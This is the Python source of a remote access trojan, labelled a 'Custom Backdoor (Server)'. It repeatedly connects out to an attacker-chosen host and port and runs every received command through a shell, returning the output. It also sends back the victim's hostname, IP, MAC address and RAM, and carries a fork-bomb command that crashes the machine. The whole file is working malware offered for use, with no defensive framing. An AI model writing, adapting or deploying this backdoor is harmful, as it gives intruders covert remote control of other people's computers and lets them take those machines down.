#!/usr/bin/env python

''' Custom Backdoor (Server) '''

# Modules
import argparse                             # CLI arguments
import os                                   # Duplicate file descriptors
import platform                             # System information
from psutil import virtual_memory           # Get machine RAM
from re import findall                      # Filter MAC Address
import socket                               # Estabilish connection
import subprocess                           # Run commands
import sys                                  # Exit codes
from time import sleep                      # Connection retries
from uuid import getnode                    # MAC Address


# TODO: Add more custom functionalities
# TODO: Add PTY shell
# TODO: Add UDP connection method
# FIXME: IndexError if no input is provided by client


# Main Code
class Rat:

    def __init__(self, rhosts, rport, lport=None):
        ''' Try to estabilish a connection to attacker's machine '''
        self.RHOST = rhosts
        self.RPORT = int(rport)
        self.LPORT = int(lport) if lport else None
        self.connect()

    def connect(self):
        ''' This function will retry connection until estabilished '''
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)   # Avoid "Address already in use" error
        self.server.bind(('127.0.0.1', self.LPORT)) if self.LPORT else None   # Use custom local port if defined

        while True:
            try:
                self.server.connect((self.RHOST, self.RPORT))
                self.handler()
            except socket.error:
                sleep(5)   # Retry connection after a few seconds
            except socket.gaierror:
                sys.exit(f"[!] Can't connect to remote machine")
            except KeyboardInterrupt:
                self.server.send(b'[!] Victim terminated connection')
                self.close_socket()

    def close_socket(self):
        self.server.shutdown(0)
        self.server.close()
        self.connect()

    def handler(self):
        while True:
            ''' Receive commands '''
            command = self.server.recv(4096).decode()

            ''' Custom funcionalities '''
            try:
                # Handles "cd" command
                if command.split(' ')[0] in ('cd'):
                    os.chdir(command.split(' ')[1])
                    self.server.send(b'')

                # DO NOT test on your own machine since this can damage the computer
                if command in ('forkbomb'):
                    while True:
                        os.fork()

                # Outputs target's system information
                if command in ('sysinfo'):
                    system_information = f'OS Name: {platform.system()}\n\
                    OS Release: {platform.release()}\n\
                    OS Version: {platform.version()}\n\
                    Hostname: {socket.gethostname()}\n\
                    IP Address: {socket.gethostbyname(socket.gethostname())}\n\
                    MAC Address: {':'.join(findall('..', '%012x' % getnode()))}\n\
                    RAM: {str(round(virtual_memory().total / (1024.0 **3)))+"GB"'
                    self.server.send(system_information.encode())

                # Closes connection and keep backdoor
                if command in ('exit', 'quit'):
                    self.server.close()
                    self.connect()  # Restart connection loop

                # Backdoor permanent shutdown, do not use it unless completly sure
                if command in ('disable'):
                    self.close_socket()

                ''' Sends response '''
                op = subprocess.Popen(  # Process Open
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
                stdout = op.stdout.read()
                stderr = op.stderr.read()
                self.server.send(stdout + stderr)

            except Exception:
                self.close_socket()
                
if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('--rhost', dest='rhost',
                        help='Set remote host',
                        required=True, metavar='HOST')
    parser.add_argument('--rport', dest='rport',
                        help='Set remote port',
                        required=True, metavar='PORT')
    parser.add_argument('--lport', dest='lport',
                        help='Set local port',
                        required=False, metavar='PORT')
    parser.add_argument('--udp', dest='udp',
                        help='Set UDP mode',
                        required=False)
    args = parser.parse_args()

    rat = Rat(args.rhost, args.rport)